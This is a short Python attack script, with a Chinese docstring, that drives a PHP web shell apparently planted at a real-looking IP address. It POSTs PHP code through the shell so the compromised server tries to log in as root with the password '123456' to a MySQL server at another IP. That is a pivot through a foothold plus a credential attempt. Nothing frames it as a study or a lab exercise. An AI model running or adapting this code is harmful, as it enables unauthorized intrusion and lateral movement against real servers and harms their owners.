#!/usr/bin/env python3
"""从81.70连124.71 MySQL - 不带@看完整错误"""
import urllib.request, urllib.parse

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=60):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:80]}"

code = '''
mysqli_report(MYSQLI_REPORT_OFF);
$c=mysqli_connect('124.71.142.158', 'root', '123456', '', 3306);
if(!$c){print_r('FAIL:' . mysqli_connect_errno() . ':' . mysqli_connect_error());}else{print_r('CONN_OK:' . mysqli_get_server_info($c));mysqli_close($c);}
'''
r = cmd(code, 60)
print("root/123456:", r.strip()[-150:], flush=True)
